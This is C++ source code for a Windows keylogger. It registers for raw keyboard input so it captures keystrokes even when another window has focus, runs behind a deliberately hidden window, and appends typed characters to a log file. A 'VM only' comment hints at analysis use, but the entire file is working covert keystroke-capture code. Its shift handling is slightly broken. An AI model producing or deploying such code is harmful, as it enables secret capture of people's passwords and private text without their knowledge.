#include <windows.h>
#include <iostream>
#include <fstream>

// Log file (in VM only!)
std::ofstream logFile("C:\\keylog_analysis.txt", std::ios::app);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            RAWINPUTDEVICE rid;
            rid.usUsagePage = 0x01;         // Generic desktop controls
            rid.usUsage = 0x06;             // Keyboard
            rid.dwFlags = RIDEV_INPUTSINK;  // Capture even when not focused
            rid.hwndTarget = hwnd;
            RegisterRawInputDevices(&rid, 1, sizeof(rid));
            break;
        }
        case WM_INPUT: {
            UINT dwSize;
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
            LPBYTE lpb = new BYTE[dwSize];
            if (lpb == NULL) return 0;

            if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize)
                OutputDebugString(L"GetRawInputData size mismatch");

            RAWINPUT* raw = (RAWINPUT*)lpb;
            if (raw->header.dwType == RIM_TYPEKEYBOARD) {
                USHORT vkey = raw->data.keyboard.VKey;
                if (vkey >= 0x20 && vkey <= 0x7F) { // Printable ASCII
                    char c = (char)vkey;
                    if (GetKeyState(VK_SHIFT) & 0x8000) {
                        // Simple shift handling (basic; real loggers use ToAscii)
                        if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
                    }
                    logFile << c;
                    logFile.flush();
                } else if (vkey == VK_RETURN) {
                    logFile << "\n";
                    logFile.flush();
                }
            }
            delete[] lpb;
            break;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    const wchar_t CLASS_NAME[] = L"HiddenInputClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    // Create HIDDEN window (no visible UI)
    HWND hwnd = CreateWindowEx(
        0, CLASS_NAME, L"Input Monitor", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, SW_HIDE); // Ensure hidden

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    logFile.close();
    return 0;
}